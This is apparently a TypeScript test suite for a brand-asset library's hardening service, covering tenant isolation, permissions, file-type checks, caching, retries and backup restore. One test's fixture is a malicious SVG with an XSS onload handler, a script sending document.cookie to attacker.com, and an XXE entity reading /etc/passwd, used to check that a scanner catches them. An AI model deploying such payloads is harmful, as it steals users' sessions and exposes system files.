/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { brandAssetRepository } from './repositories/brandAssetRepository';
import { assetProductionHardeningService } from './services/assetProductionHardeningService';

const TEST_WORKSPACE = 'ws_hardening_test';
const ALIEN_WORKSPACE = 'ws_alien_competitor';
const TEST_USER = 'user_sec_ops';

describe('PHASE 11 — AssetLibrary Security, Performance & Production Hardening', () => {
  beforeEach(async () => {
    // Clean up test workspaces
    for (const ws of [TEST_WORKSPACE, ALIEN_WORKSPACE]) {
      const active = await brandAssetRepository.listByWorkspace(ws, { limit: 200 });
      for (const a of active) {
        await brandAssetRepository.deletePermanently(ws, a.assetId);
      }
      const archived = await brandAssetRepository.listByWorkspace(ws, { section: 'Archived', limit: 200 });
      for (const a of archived) {
        await brandAssetRepository.deletePermanently(ws, a.assetId);
      }
    }
  });

  it('1. Security: Strictly blocks cross-tenant data access attempts', () => {
    // Attempt to access ALIEN_WORKSPACE asset from TEST_WORKSPACE session
    assert.throws(
      () => {
        assetProductionHardeningService.assertTenantIsolation(TEST_WORKSPACE, ALIEN_WORKSPACE);
      },
      (err: Error) => {
        return (
          err.message.includes('FORBIDDEN_CROSS_TENANT_ACCESS') &&
          err.message.includes(TEST_WORKSPACE) &&
          err.message.includes(ALIEN_WORKSPACE)
        );
      }
    );

    // Same-workspace access must pass without error
    assert.doesNotThrow(() => {
      assetProductionHardeningService.assertTenantIsolation(TEST_WORKSPACE, TEST_WORKSPACE);
    });
  });

  it('2. Security: Enforces Role-Based Access Control (RBAC) across viewer, member, and admin tiers', () => {
    // 1. Viewer cannot write or delete
    const viewerWrite = assetProductionHardeningService.checkPermission('viewer', 'write');
    assert.equal(viewerWrite.allowed, false);
    assert.equal(viewerWrite.statusCode, 403);

    const viewerDelete = assetProductionHardeningService.checkPermission('viewer', 'delete');
    assert.equal(viewerDelete.allowed, false);
    assert.equal(viewerDelete.statusCode, 403);

    const viewerRead = assetProductionHardeningService.checkPermission('viewer', 'read');
    assert.equal(viewerRead.allowed, true);
    assert.equal(viewerRead.statusCode, 200);

    // 2. Member can write, but cannot permanently delete
    const memberWrite = assetProductionHardeningService.checkPermission('member', 'write');
    assert.equal(memberWrite.allowed, true);

    const memberDelete = assetProductionHardeningService.checkPermission('member', 'delete');
    assert.equal(memberDelete.allowed, false);
    assert.equal(memberDelete.statusCode, 403);

    // 3. Admin has full rights
    const adminDelete = assetProductionHardeningService.checkPermission('admin', 'delete');
    assert.equal(adminDelete.allowed, true);
  });

  it('3. Security: Detects malicious SVG vectors, script injections, and XXE attacks', () => {
    const maliciousSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
        <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        <a href="javascript:alert(1)"><text>Click</text></a>
      </svg>
    `;

    const result = assetProductionHardeningService.scanPayloadForMalware(maliciousSvg);

    assert.equal(result.isClean, false);
    assert.ok(result.threatsDetected.includes('MALICIOUS_SCRIPT_TAG_INJECTION'));
    assert.ok(result.threatsDetected.includes('INLINE_DOM_EVENT_HANDLER'));
    assert.ok(result.threatsDetected.includes('JAVASCRIPT_PSEUDO_PROTOCOL'));
    assert.ok(result.threatsDetected.includes('XML_EXTERNAL_ENTITY_EXPANSION_ATTEMPT'));

    // Verify sanitized output neutralizes threats
    assert.ok(result.sanitizedContent);
    assert.equal(result.sanitizedContent.includes('<script>'), false);
    assert.equal(result.sanitizedContent.includes('onload='), false);
  });

  it('4. Security: Validates magic byte signatures and enforces STRICT VIDEO EXCLUSION', () => {
    // 1. Valid PNG buffer (89 50 4E 47 0D 0A 1A 0A)
    const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    const pngResult = assetProductionHardeningService.validateMagicBytes(pngBuffer, 'image/png');
    assert.equal(pngResult.isValid, true);
    assert.equal(pngResult.detectedMimeType, 'image/png');
    assert.equal(pngResult.isForbiddenVideo, false);

    // 2. Video file (MP4 signature: 00 00 00 20 66 74 79 70 'ftyp')
    const mp4Buffer = Buffer.from([0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6f, 0x6d]);
    const mp4Result = assetProductionHardeningService.validateMagicBytes(mp4Buffer, 'video/mp4');
    assert.equal(mp4Result.isValid, false);
    assert.equal(mp4Result.isForbiddenVideo, true);

    // 3. Matroska / WebM EBML ID (1A 45 DF A3)
    const webmBuffer = Buffer.from([0x1a, 0x45, 0xdf, 0xa3, 0x9f, 0x42, 0x86, 0x81]);
    const webmResult = assetProductionHardeningService.validateMagicBytes(webmBuffer, 'video/webm');
    assert.equal(webmResult.isValid, false);
    assert.equal(webmResult.isForbiddenVideo, true);
  });

  it('5. Data Integrity: Audits workspace for duplicate checksums and broken parent lineages', async () => {
    const sharedChecksum = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';

    // 1. Create duplicate assets sharing identical checksum
    await brandAssetRepository.create({
      workspaceId: TEST_WORKSPACE,
      businessId: TEST_WORKSPACE,
      name: 'Logo Master Copy A',
      section: 'Identity',
      verifiedMetadata: {
        truthVerified: true,
        checksumSha256: sharedChecksum,
        integrityPassed: true,
      },
      createdBy: TEST_USER,
    });

    await brandAssetRepository.create({
      workspaceId: TEST_WORKSPACE,
      businessId: TEST_WORKSPACE,
      name: 'Logo Master Copy B',
      section: 'Identity',
      verifiedMetadata: {
        truthVerified: true,
        checksumSha256: sharedChecksum,
        integrityPassed: true,
      },
      createdBy: TEST_USER,
    });

    // 2. Create asset pointing to broken non-existent parent
    await brandAssetRepository.create({
      workspaceId: TEST_WORKSPACE,
      businessId: TEST_WORKSPACE,
      name: 'Orphaned Derivative Card',
      section: 'Social Media',
      parentAssetId: 'asset_non_existent_99999',
      createdBy: TEST_USER,
    });

    const audit = await assetProductionHardeningService.auditWorkspaceIntegrity(TEST_WORKSPACE);

    assert.equal(audit.totalAssetsScanned, 3);
    assert.equal(audit.duplicateChecksumGroups.length, 1);
    assert.equal(audit.duplicateChecksumGroups[0].assetIds.length, 2);
    assert.equal(audit.brokenVersionLineages.length, 1);
  });

  it('6. Performance & Scale: Executes chunked batch writes and realistic load benchmarking', async () => {
    const benchmark = await assetProductionHardeningService.runLoadBenchmark(TEST_WORKSPACE, 20);

    assert.equal(benchmark.sampleSize, 20);
    assert.ok(benchmark.totalDurationMs >= 0);
    assert.ok(benchmark.averageLatencyMs >= 0);
    assert.equal(benchmark.honestConcurrencyLimit, 50);

    const honestyStatement = assetProductionHardeningService.getHonestyStatement();
    assert.ok(honestyStatement.includes('Realistic architectural bounds'));
    assert.ok(honestyStatement.includes('Video pipelines are 100% excluded'));
  });

  it('7. AI Cost Control: Prevents redundant model calls via checksum-keyed intelligence caching', () => {
    const testChecksum = 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3';
    const mockAnalysis = {
      qualityScore: 94,
      visualStyle: 'Bold Geometric',
      dominantColors: [{ hex: '#FF7417' }],
    };

    // 1. Initial lookup -> Cache Miss
    const initial = assetProductionHardeningService.getCachedAnalysis(testChecksum);
    assert.equal(initial, null);

    // 2. Store analysis result
    assetProductionHardeningService.setCachedAnalysis(testChecksum, mockAnalysis, 2000);

    // 3. Subsequent lookup -> Cache Hit (zero Gemini LLM tokens used)
    const cached = assetProductionHardeningService.getCachedAnalysis(testChecksum);
    assert.ok(cached);
    assert.equal(cached.cacheHit, true);
    assert.deepEqual(cached.analysis, mockAnalysis);

    const summary = assetProductionHardeningService.getAiCostSummary(TEST_WORKSPACE);
    assert.ok(summary.cachedAnalysisHits >= 1);
    assert.ok(summary.tokensAvoidedByCache >= 2000);
    assert.ok(summary.estimatedCreditsSaved > 0);
  });

  it('8. Reliability: Retries transient failures with exponential backoff and routes to Dead-Letter Queue', async () => {
    let callCount = 0;

    // Simulate persistent failure
    const failingJob = async () => {
      callCount++;
      throw new Error('Database socket timeout (simulated)');
    };

    const result = await assetProductionHardeningService.dispatchJobWithRetry({
      workspaceId: TEST_WORKSPACE,
      jobType: 'PREFLIGHT_CMYK_EXTRACTION',
      payload: { assetId: 'asset_retry_test_01' },
      handler: failingJob,
      maxRetries: 3,
    });

    assert.equal(result.success, false);
    assert.equal(result.attempts, 3);
    assert.equal(result.routedToDeadLetter, true);
    assert.equal(callCount, 3);

    // Verify queue health reflects dead-letter record
    const health = await assetProductionHardeningService.getQueueHealth(TEST_WORKSPACE);
    assert.ok(health.deadLetterCount >= 1);
  });

  it('9. Backup & Disaster Recovery: Generates manifest checksum snapshot and restores atomically', async () => {
    // 1. Create asset and collection to snapshot
    const originalAsset = await brandAssetRepository.create({
      workspaceId: TEST_WORKSPACE,
      businessId: TEST_WORKSPACE,
      name: 'Corporate Identity Seal',
      section: 'Identity',
      createdBy: TEST_USER,
    });

    const originalCol = await brandAssetRepository.createCollection(TEST_WORKSPACE, {
      name: 'Essential Brand Assets',
      assetIds: [originalAsset.assetId],
      createdBy: TEST_USER,
    });

    // 2. Generate snapshot
    const snapshot = await assetProductionHardeningService.createDisasterRecoverySnapshot(TEST_WORKSPACE);
    assert.ok(snapshot.snapshotId);
    assert.ok(snapshot.manifestChecksumSha256);
    assert.equal(snapshot.assetCount >= 1, true);
    assert.equal(snapshot.collectionCount >= 1, true);

    // 3. Test tamper detection (modifying manifest checksum should abort restore)
    const tamperedSnapshot = { ...snapshot, manifestChecksumSha256: 'corrupted_hash_999' };
    await assert.rejects(
      async () => {
        await assetProductionHardeningService.restoreFromSnapshot(TEST_WORKSPACE, tamperedSnapshot);
      },
      (err: Error) => err.message.includes('CORRUPTED_BACKUP_SNAPSHOT')
    );

    // 4. Test authentic restore
    const restoreResult = await assetProductionHardeningService.restoreFromSnapshot(TEST_WORKSPACE, snapshot);
    assert.ok(restoreResult.restoredAssets >= 1);
    assert.ok(restoreResult.restoredCollections >= 1);
  });
});
